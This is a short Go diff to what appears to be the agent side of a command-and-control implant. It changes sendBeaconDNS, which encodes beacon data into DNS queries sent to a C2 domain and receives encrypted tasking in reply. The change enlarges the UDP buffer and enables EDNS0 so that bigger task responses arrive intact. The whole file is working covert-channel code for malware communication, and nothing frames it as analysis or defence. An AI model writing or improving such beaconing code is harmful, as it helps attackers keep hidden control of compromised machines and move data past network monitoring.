@@ -12,7 +12,10 @@ import (
 	mdns "github.com/miekg/dns"
 )
 
-const agentDNSChunkSize = 30 // must match server-side ChunkForDNS chunk size
+const (
+	agentDNSChunkSize = 30   // must match server-side ChunkForDNS chunk size
+	agentDNSUDPSize   = 4096 // enough for encrypted task TXT responses
+)
 
 // sendBeaconDNS transmits an encoded beacon over DNS and returns the server's encrypted response.
 // Each chunk is base32-encoded and sent as a DNS A-record query.
@@ -28,7 +31,7 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 	// Derive server address from domain — send queries to port 53 of the C2 domain.
 	serverAddr := net.JoinHostPort(domain, "53")
 
-	client := &mdns.Client{Net: "udp", Timeout: 5 * time.Second}
+	client := &mdns.Client{Net: "udp", Timeout: 5 * time.Second, UDPSize: agentDNSUDPSize}
 	sessionID, err := dnsSessionID()
 	if err != nil {
 		return nil, fmt.Errorf("generate DNS session ID: %w", err)
@@ -44,6 +47,7 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 
 		msg := new(mdns.Msg)
 		msg.SetQuestion(qname, mdns.TypeA)
+		msg.SetEdns0(agentDNSUDPSize, false)
 		msg.RecursionDesired = false
 
 		resp, _, err := client.Exchange(msg, serverAddr)
